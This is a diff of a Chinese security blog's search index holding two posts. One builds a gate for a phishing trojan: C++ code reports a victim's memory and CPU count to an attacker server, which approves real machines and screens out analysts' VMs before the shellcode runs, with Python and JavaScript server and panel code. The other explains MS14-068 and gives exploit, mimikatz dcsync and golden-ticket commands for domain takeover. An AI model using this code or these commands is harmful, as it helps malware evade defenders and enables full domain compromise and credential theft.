-<p>通过这种方式可以部署一些<strong>只有内网ipv4才可以访问</strong>的服务，例如我就用niginx开了个ipv4的端口，将数据转发到了路由器上，下次ipv6出现问题也就可以直接通过Zerotier访问路由器重启ipv6服务</p>
-<h2 id="安全性">安全性</h2>
-<p>Zerotier作为一款强大的网络存取服务，拥有内置的AES-256加密算法，并提供安全控制，可以控制用户连接的访问，以限制对私有网络的访问，并防止未经授权的访问，所以Zerotier的安全性还是比较高的</p>
-<h1 id="结语">结语</h1>
-<p>总的来说，ZeroTier的使用确实非常容易。它的简单易用性，功能丰富的网络功能和强大的安全特性，使ZeroTier成为最佳的专业网络解决方案，特别是在新兴兼容性和技术能力需求时期。</p>
-<p>（此段结语由ChatGPT生成，嘻嘻~~，总的来说Zerotier还是比较简单好用的，有内网访问需求的伙伴们可以考虑使用）</p>
-]]></content>
-      <categories>
-        <category>使用体验</category>
-      </categories>
-      <tags>
-        <tag>zerotier</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内网渗透之ms14_068和黄金、白银票据</title>
-    <url>/post/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bms14-068%E5%92%8C%E9%BB%84%E9%87%91%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</url>
-    <content><![CDATA[<h1 id="MS14-068">MS14-068</h1>
-<p>MS14-068 是微软在 2014 年 11 月发布的一个安全公告,其中提到了 Windows 操作系统中存在的一个漏洞,对应的补丁号是<code>KB3011780</code>.该漏洞被称为 Kerberos Checksum Vulnerability,允许攻击者通过伪造 Kerberos 协议包来获取域控制器的权限,从而可能导致整个 Active Directory 域受到攻击.</p>
-<p>该漏洞影响 Windows Server 2003、Windows Vista、Windows Server 2008、Windows 7 和 Windows Server 2008 R2 等多个版本的 Windows 操作系统,并被评定为危急级别.</p>
-<h2 id="原理">原理</h2>
-<p>在学习这个漏洞之前我们要先明白kerberos协议的认证流程：</p>
-<p><img src="https://img2018.cnblogs.com/blog/1222663/201910/1222663-20191029184606216-1725954036.png" alt=""></p>
-<p>在kerberos最初的设计流程中只说明了如何证明客户端的真实身份,并没有说明客户端是否有权限访问这个服务,为了解决这个问题,微软引入了<code>PAC（Privilege Attribute Certificate）</code>用来辨明用户的身份和权限.</p>
-<p>PAC 包含了<code>用户身份信息（包括用户的用户名、域名、SID（Security Identifier）等）</code>、<code>授权信息（包括用户所属的组别以及每个组别对应的 SID 和权限,用于判断用户是否具有相应的访问权限）</code>、<code>签名信息（用于验证 PAC 的完整性和真实性,防止篡改和伪造攻击）</code>和其他辅助信息,</p>
-<p>在 Kerberos 认证中,PAC数字签名包含两部分：<code>PAC 签名</code>和<code>票据签名</code>.</p>
+    <title>一个简单的准接入</title>
+    <url>/post/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%87%86%E6%8E%A5%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="目标">目标</h1>
+<p>教育护网的时候出现了钓鱼的木马样本被安全人员分析导致cs服务器的ip被封的情况，就想着写一个简单的<code>准接入控制平台</code>，来控制肉鸡是否允许连接至cs服务器。</p>
+<p>理想效果是：<strong>点击木马以后，会先发送连接请求到接入控制服务器，在服务器上允许接入以后，木马运行shellcode，否则程序结束。</strong></p>
+<p>肉鸡在请求连接的时候，会携带电脑的部分信息（处理器数量、内存大小等），方便攻击者判断是否为虚拟机环境</p>
+<h1 id="开搞">开搞</h1>
+<p>思路：控制服务器打算用python的<code>flask</code>来写，客户端与服务器的通信采用<code>socket连接</code></p>
 <ol>
-<li>
-<p>PAC 签名：用于验证 PAC 中携带的用户安全属性信息是否被篡改或伪造.在<code>生成 TGT</code> 时,KDC（Key Distribution Center）会使用其<code>krbtgt服务账户的密码哈希</code>对 PAC 进行数字签名,并将签名结果添加到 TGT 中.在后续的服务请求中,TGS（Ticket Granting Service）会获取 PAC,并利用 KDC 的公钥来验证 PAC 签名的真实性.</p>
-</li>
-<li>
-<p>票据签名：用于验证票据是否被篡改或伪造.在<code>生成 TGS 票据</code>时,TGS 使用<code>服务账户的密码哈希</code>对票据进行数字签名,并将签名结果添加到 TGS 标志中.在服务端接收到客户端请求时,会提取 TGS 票据中的票据签名,并利用服务账户的公钥来验证票据的真实性.</p>
-</li>
+<li>客户端会发送自己的<code>内存大小</code>以及<code>处理器数量</code>给服务端</li>
+<li>服务端将数据在网页中显示</li>
+<li>攻击者选择是否允许接入</li>
+<li>将选择结果返回给客户端</li>
 </ol>
-<p>作为一名低权限用户,如果我们想要访问高权限用户才能访问的服务,我们只需要获取到<code>高权限用户的TGT</code>就可以了,而通过MS14-068这个漏洞我们就可以获取到高权限用户的TGT</p>
-<p>原理：</p>
-<p>客户端在发起认证请求时,通过设置<code>include-PAC</code>为<code>False</code>,则返回TGT中不会包含PAC</p>
-<p><img src="image-20230416151131851.png" alt="image-20230416151131851"></p>
-<p>此时我们可以构造一个新的PAC,这个PAC里的User SID 和 Group SID都是<code>高权限用户的User SID 和 Group SID</code>而PAC尾部的签名则是使用将前面的data（User SID &amp; Group SID）进行MD5加密得到<code>MD5值</code>作为签名,这里就是微软的第一个错误：</p>
-<p><strong>在KDC机构对PAC进行验证时,对于PAC尾部的签名算法,虽然原理上规定必须是带有Key的签名算法才可以,但微软在实现上,却允许任意签名算法,只要客户端指定任意签名算法,KDC服务器就会使用指定的算法进行签名验证.</strong></p>
-<p>同时我们在客户端生成一个随机数<code>subkey</code>,用这个随机数对PAC进行加密,这个subkey会被放到TGS_REQ的<code>Authenticator</code>中,同时我们要发送的TGS_REQ中还包含<code>低权限用户的TGT</code>和<code>我们之前构造的PAC</code>,但这个PAC并不在TGT里面而是在外面</p>
-<p><img src="image-20230416152934190.png" alt="image-20230416152934190"></p>
-<p>此时发送我们所构造的恶意的TGS-REQ,这里微软犯了第二个错：</p>
-<p><strong>PAC没有被放在TGT中,而是放在了TGS_REQ数据包的其它地方.但可笑的是,KDC在实现上竟然允许这样的构造,也就是说,KDC能够正确解析出没有放在其它地方的PAC信息.</strong></p>
-<p>意味着我们所构造的PAC是可以被解析的,配合微软的第三个错：</p>
-<p><strong>KDC验证缺少PAC的TGT成功后,再验证不在TGT中 的PAC的合法性.如果2个均验证成功,KDC把PAC中的User  SID、Group  SID取出来,重新使用进行签名,签名算法和密钥与设置inclue-pac标志位为TRUE时一模一样.将将新产生的PAC加入到解密后的TGT中,再重新加密制作全新的TGT发送给Client,不是TGS</strong></p>
-<p>最后就会返回一个<code>高权限用户的TGT</code></p>
-<p><img src="image-20230416153252369.png" alt="image-20230416153252369"></p>
-<p>到这里我们就已经将原理分析清楚了,接下来谈谈它的利用</p>
-<h2 id="利用">利用</h2>
-<p>首先下载<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">MS14-068.exe</a></p>
-<p>查看补丁信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">或者</span><br><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
-<p>得到当前用户的sid</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>
-<p>使用MS14-068.exe</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</span><br></pre></td></tr></table></figure>
-<p>成功以后会生成一个ccache文件</p>
-<p>使用mimikatz</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kerberos::purge#清除原有票据</span><br><span class="line">kerberos::ptc C:\XXXX.ccache#将管理员证书写入</span><br></pre></td></tr></table></figure>
-<p>详细的漏洞复现网上有一大堆,可以参考这篇文章：<a href="https://www.cnblogs.com/yuzly/p/10859520.html">MS14-068域提权漏洞复现</a></p>
-<p>更详细的原理分析可以参考：<a href="https://blog.csdn.net/zy_strive_2012/article/details/51698780">ms14-068的深入分析</a></p>
-<h1 id="黄金票据">黄金票据</h1>
-<p><code>黄金票据（Golden  Ticket）</code>指黑客通过窃取Kerberos域控制器（KDC）的<code>krbtgt帐号的密码哈希值</code>,生成伪造的<code>票据（TGT）</code>来获取对整个Kerberos领域的完全访问权限的过程.这种攻击方式被称为“黄金”票据,因为它赋予了攻击者类似于使用黄金密钥一样的特权来绕过Kerberos的身份验证和授权机制,从而可以自由地访问所有资源,并且很难被检测到和防止.</p>
-<p>由于TGT部分是利用<code>krbtgt帐号的密码哈希</code>来加密的,KDC验证TGT是否有效也是用krbtgt帐号的密码哈希来解密,如果我们知道了krbtgt帐号的密码哈希,就可以自己伪造一个TGT了,而一般要得到krbtgt的密码哈希都是通过域控来拿的,所以黄金票据适合用来做<code>权限维持</code></p>
-<p>利用条件：<code>域名</code>、<code>域的sid</code>、<code>域的KRBTGT账户NTLM密码哈希</code>、<code>伪造对象用户名</code></p>
-<p>获取域名：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">net time /domain</span><br><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
-<p>获取sid：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>
-<p>获取域的KRBTGT账户NTLM密码哈希或者aes-256值</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:xx.com /user:krbtgt /csv</span><br></pre></td></tr></table></figure>
-<p>查看域管理员用户名</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>
-<p>使用mimikatz</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">klist purge</span><br><span class="line"><span class="attr">kerberos</span>::golden  /<span class="attr">admin</span>:administrator  /<span class="attr">domain</span>:xx.<span class="property">com</span>  /<span class="attr">sid</span>:xxxx /<span class="attr">krbtgt</span>:xxxx  /ptt</span><br></pre></td></tr></table></figure>
-<p>参考：<a href="https://cloud.tencent.com/developer/article/2130133">一文了解黄金票据和白银票据</a></p>
-<h1 id="白银票据">白银票据</h1>
-<p><code>白银票据（Silver  Ticket）</code>指黑客通过窃取目标主机上的<code>服务账号的密码哈希值</code>,生成伪造的<code>服务票据（ST）</code>来获取对该主机上特定服务的访问权限.这种攻击方式被称为“白银”票据,因为它不像“黄金”票据那样具有完全的控制权限,只能用于访问特定的服务,并且难以被检测到和防止.</p>
-<p>与TGT类似,ST（Service Ticket）通过<code>服务账户的密码哈希</code>进行加密,如果我们知道了对应服务账户的密码哈希,我们就可以伪造该相关服务的ST,从而访问到该服务</p>
-<p>实操可参考：<a href="https://cloud.tencent.com/developer/article/1760135">白银票据（Silver Ticket）攻击</a></p>
+<h2 id="获取内存大小以及处理器数量">获取内存大小以及处理器数量</h2>
+<p>windows中自带了API可以非常方便的用来获取这两个参数，分别是<code>GlobalMemoryStatusEx</code>方法和<code>GetSystemInfo</code>方法</p>
+<p>具体代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取内存大小</span></span><br><span class="line">MEMORYSTATUSEX meminfo;</span><br><span class="line">meminfo.dwLength = <span class="built_in">sizeof</span>(MEMORYSTATUSEX);</span><br><span class="line"><span class="built_in">GlobalMemoryStatusEx</span>(&amp;meminfo);</span><br><span class="line">DWORDLONG  memory_num = meminfo.ullTotalPhys / (<span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line"><span class="comment">//获取处理器数量</span></span><br><span class="line">SYSTEM_INFO sysinfo;</span><br><span class="line"><span class="built_in">GetSystemInfo</span>(&amp;sysinfo);</span><br><span class="line">DWORD core_count = sysinfo.dwNumberOfProcessors; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">to_string</span>(memory_num)+ <span class="string">&quot;,&quot;</span>+ <span class="built_in">to_string</span>(core_count);</span><br></pre></td></tr></table></figure>
+<p>如果电脑是16G内存带有16个处理器的话，该程序会返回一个字符串“16000,16”</p>
+<h2 id="socket客户端">socket客户端</h2>
+<p>用c++来写socket主要利用的是<code>ws2_32.lib</code>，所以要先导入</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure>
+<p>接下来就是调用对应的api进行操作了，整体代码为:</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化Winsock库</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> iResult = <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;WSAStartup failed: &quot;</span> &lt;&lt; iResult &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个TCP socket</span></span><br><span class="line">SOCKET ConnectSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;socket failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定服务端的IP地址和端口号</span></span><br><span class="line">sockaddr_in serverAddr;</span><br><span class="line">serverAddr.sin_family = AF_INET;</span><br><span class="line">serverAddr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;192.168.200.225&quot;</span>); <span class="comment">// 服务端IP地址</span></span><br><span class="line">serverAddr.sin_port = <span class="built_in">htons</span>(<span class="number">9999</span>); <span class="comment">// 服务端端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接到服务端</span></span><br><span class="line">iResult = <span class="built_in">connect</span>(ConnectSocket, (SOCKADDR*)&amp;serverAddr, <span class="built_in">sizeof</span>(serverAddr));</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;connect failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送数据到服务端</span></span><br><span class="line">iResult = <span class="built_in">send</span>(ConnectSocket, sendData.<span class="built_in">c_str</span>(), sendData.<span class="built_in">length</span>(), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;send failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收服务端返回的数据</span></span><br><span class="line"><span class="type">char</span> recvData[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">iResult = <span class="built_in">recv</span>(ConnectSocket, recvData, <span class="built_in">sizeof</span>(recvData), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Received: &quot;</span> &lt;&lt; recvData[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span> (recvData[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;服务端准许接入&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;服务端不准许接入&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Connection closed&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;recv failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭socket连接</span></span><br><span class="line"><span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br></pre></td></tr></table></figure>
+<p>上述代码会通过socket连接到192.168.200.225的9999端口，发送<code>sendData</code>，并等待返回数据，如果返回1则输出“服务端准许接入”，返回0则输出“服务端不准许接入”</p>
+<h2 id="socket服务端">socket服务端</h2>
+<p>服务端用python来写，通过<code>socketserver</code>这个包来处理多个客户端的连接请求。</p>
+<p>首先定义一个<code>socket_server_start</code>方法来监听<code>socket请求</code>，当连接建立以后将会调用<code>MyTCPHandler类</code>的<code>handle</code>方法。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">socket_server_start</span>():</span><br><span class="line">    HOST, PORT = <span class="string">&quot;192.168.200.225&quot;</span>, <span class="number">9999</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;server start listen on &#x27;</span>+PORT)</span><br><span class="line">    <span class="keyword">with</span> socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler) <span class="keyword">as</span> server:</span><br><span class="line">        server.serve_forever()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyTCPHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Server is listening on &#123;&#125;:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.client_address[<span class="number">0</span>], self.client_address[<span class="number">1</span>]))</span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>).strip().decode()</span><br><span class="line">        memory,core  = data.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;内存大小为：&#123;&#125;MB，处理器数量为：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(memory,core))</span><br></pre></td></tr></table></figure>
+<p>在获取到计算机硬件信息后，将信息存储到一个列表里，通过flask创建一个路由用来返回json格式的数据，再在前端通过fetch来获取数据并显示出来</p>
+<h2 id="显示数据">显示数据</h2>
+<p>通过displayBox函数将收到的数据显示出来</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">displayBox</span>(<span class="params">time,ip, memory, core</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> content = <span class="string">&quot;连接时间为：&quot;</span>+time+<span class="string">&quot;&lt;br&gt;IP地址为：&quot;</span> + ip + <span class="string">&quot;&lt;br&gt;内存大小为：&quot;</span> + memory + <span class="string">&quot;MB&lt;br&gt;处理器数量为：&quot;</span> + core + <span class="string">&quot;个&lt;div&gt;&lt;button class = &#x27;button&#x27; onclick=&#x27;AllowFunction(\&quot;&quot;</span> + ip + <span class="string">&quot;\&quot;, 1)&#x27;&gt;允许&lt;/button&gt;&lt;button class = &#x27;button&#x27; onclick=&#x27;AllowFunction(\&quot;&quot;</span> + ip + <span class="string">&quot;\&quot;, 0)&#x27; &gt;拒绝&lt;/button&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> box = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">  box.<span class="property">className</span> = <span class="string">&quot;red-box&quot;</span>;</span><br><span class="line">  box.<span class="property">innerHTML</span> = content;</span><br><span class="line">  container.<span class="title function_">appendChild</span>(box);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="“允许”或“拒绝”">“允许”或“拒绝”</h2>
+<p>在上述函数中，点击“允许”调用<code>AllowFunction(ip,1)</code>，点击拒绝则调用<code>AllowFunction(ip,0)</code></p>
+<p>通过AllowFunction函数向flask服务器发起一个请求来修改对应ip的准接入结果</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">function</span> <span class="title function_">AllowFunction</span>(<span class="params">ip, isallow</span>)&#123;</span><br><span class="line"><span class="comment">// 构建请求的 URL</span></span><br><span class="line">  <span class="keyword">const</span> url = host+<span class="string">`change?ip=<span class="subst">$&#123;ip&#125;</span>&amp;isallow=<span class="subst">$&#123;isallow&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 发起 GET 请求</span></span><br><span class="line">  <span class="title function_">fetch</span>(url)</span><br><span class="line">   .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;请求成功&quot;</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求失败&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;)</span><br><span class="line">   .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求发生错误&quot;</span>, error);</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure>
+<p>最后回到socket服务端，将修改后的结果返回给socket客户端</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.request.sendall(<span class="built_in">str</span>(cmps[i][<span class="string">&quot;isallow&quot;</span>]).encode())</span><br></pre></td></tr></table></figure>
+<h1 id="效果">效果</h1>
+<p><img src="image-20230702154823650.png" alt="image-20230702154823650"></p>
+<p>第一个是真机，第二个是虚拟机<img src="image-20230702164949851.png" alt="image-20230702164949851"></p>
+<h1 id="升级">升级</h1>
+<p>通过准接入系统可以做的事情还有很多，可以试着携带更多的信息来帮助我们判断是真机还是虚拟机，同时也可以将shellcode放到服务器，允许接入后将shellocde返回给客户端并加载。</p>
 ]]></content>
       <categories>
-        <category>渗透</category>
+        <category>技术</category>
       </categories>
       <tags>
-        <tag>提权</tag>
-        <tag>维权</tag>
+        <tag>准入</tag>
       </tags>
   </entry>
   <entry>
@@ -1195,6 +1173,192 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
+    <title>内网渗透之ms14_068和黄金、白银票据</title>
+    <url>/post/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bms14-068%E5%92%8C%E9%BB%84%E9%87%91%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</url>
+    <content><![CDATA[<h1 id="MS14-068">MS14-068</h1>
+<p>MS14-068 是微软在 2014 年 11 月发布的一个安全公告,其中提到了 Windows 操作系统中存在的一个漏洞,对应的补丁号是<code>KB3011780</code>.该漏洞被称为 Kerberos Checksum Vulnerability,允许攻击者通过伪造 Kerberos 协议包来获取域控制器的权限,从而可能导致整个 Active Directory 域受到攻击.</p>
+<p>该漏洞影响 Windows Server 2003、Windows Vista、Windows Server 2008、Windows 7 和 Windows Server 2008 R2 等多个版本的 Windows 操作系统,并被评定为危急级别.</p>
+<h2 id="原理">原理</h2>
+<p>在学习这个漏洞之前我们要先明白kerberos协议的认证流程：</p>
+<p><img src="https://img2018.cnblogs.com/blog/1222663/201910/1222663-20191029184606216-1725954036.png" alt=""></p>
+<p>在kerberos最初的设计流程中只说明了如何证明客户端的真实身份,并没有说明客户端是否有权限访问这个服务,为了解决这个问题,微软引入了<code>PAC（Privilege Attribute Certificate）</code>用来辨明用户的身份和权限.</p>
+<p>PAC 包含了<code>用户身份信息（包括用户的用户名、域名、SID（Security Identifier）等）</code>、<code>授权信息（包括用户所属的组别以及每个组别对应的 SID 和权限,用于判断用户是否具有相应的访问权限）</code>、<code>签名信息（用于验证 PAC 的完整性和真实性,防止篡改和伪造攻击）</code>和其他辅助信息,</p>
+<p>在 Kerberos 认证中,PAC数字签名包含两部分：<code>PAC 签名</code>和<code>票据签名</code>.</p>
+<ol>
+<li>
+<p>PAC 签名：用于验证 PAC 中携带的用户安全属性信息是否被篡改或伪造.在<code>生成 TGT</code> 时,KDC（Key Distribution Center）会使用其<code>krbtgt服务账户的密码哈希</code>对 PAC 进行数字签名,并将签名结果添加到 TGT 中.在后续的服务请求中,TGS（Ticket Granting Service）会获取 PAC,并利用 KDC 的公钥来验证 PAC 签名的真实性.</p>
+</li>
+<li>
+<p>票据签名：用于验证票据是否被篡改或伪造.在<code>生成 TGS 票据</code>时,TGS 使用<code>服务账户的密码哈希</code>对票据进行数字签名,并将签名结果添加到 TGS 标志中.在服务端接收到客户端请求时,会提取 TGS 票据中的票据签名,并利用服务账户的公钥来验证票据的真实性.</p>
+</li>
+</ol>
+<p>作为一名低权限用户,如果我们想要访问高权限用户才能访问的服务,我们只需要获取到<code>高权限用户的TGT</code>就可以了,而通过MS14-068这个漏洞我们就可以获取到高权限用户的TGT</p>
+<p>原理：</p>
+<p>客户端在发起认证请求时,通过设置<code>include-PAC</code>为<code>False</code>,则返回TGT中不会包含PAC</p>
+<p><img src="image-20230416151131851.png" alt="image-20230416151131851"></p>
+<p>此时我们可以构造一个新的PAC,这个PAC里的User SID 和 Group SID都是<code>高权限用户的User SID 和 Group SID</code>而PAC尾部的签名则是使用将前面的data（User SID &amp; Group SID）进行MD5加密得到<code>MD5值</code>作为签名,这里就是微软的第一个错误：</p>
+<p><strong>在KDC机构对PAC进行验证时,对于PAC尾部的签名算法,虽然原理上规定必须是带有Key的签名算法才可以,但微软在实现上,却允许任意签名算法,只要客户端指定任意签名算法,KDC服务器就会使用指定的算法进行签名验证.</strong></p>
+<p>同时我们在客户端生成一个随机数<code>subkey</code>,用这个随机数对PAC进行加密,这个subkey会被放到TGS_REQ的<code>Authenticator</code>中,同时我们要发送的TGS_REQ中还包含<code>低权限用户的TGT</code>和<code>我们之前构造的PAC</code>,但这个PAC并不在TGT里面而是在外面</p>
+<p><img src="image-20230416152934190.png" alt="image-20230416152934190"></p>
+<p>此时发送我们所构造的恶意的TGS-REQ,这里微软犯了第二个错：</p>
+<p><strong>PAC没有被放在TGT中,而是放在了TGS_REQ数据包的其它地方.但可笑的是,KDC在实现上竟然允许这样的构造,也就是说,KDC能够正确解析出没有放在其它地方的PAC信息.</strong></p>
+<p>意味着我们所构造的PAC是可以被解析的,配合微软的第三个错：</p>
+<p><strong>KDC验证缺少PAC的TGT成功后,再验证不在TGT中 的PAC的合法性.如果2个均验证成功,KDC把PAC中的User  SID、Group  SID取出来,重新使用进行签名,签名算法和密钥与设置inclue-pac标志位为TRUE时一模一样.将将新产生的PAC加入到解密后的TGT中,再重新加密制作全新的TGT发送给Client,不是TGS</strong></p>
+<p>最后就会返回一个<code>高权限用户的TGT</code></p>
+<p><img src="image-20230416153252369.png" alt="image-20230416153252369"></p>
+<p>到这里我们就已经将原理分析清楚了,接下来谈谈它的利用</p>
+<h2 id="利用">利用</h2>
+<p>首先下载<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">MS14-068.exe</a></p>
+<p>查看补丁信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">或者</span><br><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+<p>得到当前用户的sid</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>
+<p>使用MS14-068.exe</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</span><br></pre></td></tr></table></figure>
+<p>成功以后会生成一个ccache文件</p>
+<p>使用mimikatz</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kerberos::purge#清除原有票据</span><br><span class="line">kerberos::ptc C:\XXXX.ccache#将管理员证书写入</span><br></pre></td></tr></table></figure>
+<p>详细的漏洞复现网上有一大堆,可以参考这篇文章：<a href="https://www.cnblogs.com/yuzly/p/10859520.html">MS14-068域提权漏洞复现</a></p>
